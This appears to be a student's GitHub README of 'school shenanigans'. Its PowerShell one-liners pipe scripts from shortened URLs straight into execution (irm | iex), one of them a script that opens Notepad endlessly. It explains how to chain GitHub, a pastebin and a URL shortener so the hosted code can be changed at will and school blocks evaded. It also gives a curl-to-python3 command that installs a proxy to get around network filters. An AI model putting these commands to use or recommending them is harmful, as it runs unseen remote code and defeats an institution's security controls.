# WELCOME
This is the collection of the school activities, shenanigans, etc.

:

- [powershell](#powershell)
    - [the scripts](#scripting)
    - [how its made](#creation)
    - [getting powershell](#access)
- [python](#python)
    - [proxy manager](#proxy-manager)

--- 

## PowerShell

### scripting

#### open notepad, forever... 

##### (BE CAREFUL, I AM NOT RESPONSIBLE FOR ANY DAMAGES)

``` irm "http://tiny.cc/alwaysnotepad" | iex ``` [file](/note.ps1)

#### print the entire bee movie script in the shell (I was hella bored)

``` irm "http://tiny.cc/beepowershell" | iex ``` not documented,

### creation

1. make file and upload to github
    - any file type works but i usually have it in ps1 for ease of testing amd readability
2. go to any paste bin service unblocked by your school and make a link to the raw
    - I'm not sharing mine as it will get blocked
    - in this file make a script that executes the script on github
    - the script goes like ``` irm "website url" | iex ```
      -   irm - invoke rest method - gets the script from provided source
      -   | - pipe - it sends the output of whats before to whats after
      -   iex - invoke execution - executes the script
3. now put this new link in a url shortener to make it easy to execute and name it something memorable
4. execute - just run ``` irm "your short url" | iex ``` , you could have used the github link but this you can remember
5. with the file on github you can modify any time, because most url shorteners block github, pastebins are key.


### access

#### How to get powershell on our locked computers...

coming soon to a computer near you...
---

## Python

### proxy manager

In order for this to work you must have a google account!!!

go to [Google Cloud Shell](https://shell.cloud.google.com/?hl=en_US&fromcloudshell=true&show=terminal)

initialize and set up the environment as prompted

then run the following command to install / start the proxy

``` curl "https://rb.gy/3pdco1" -L | python3 ```

wait until it loads and then click the link to open your brand new proxy
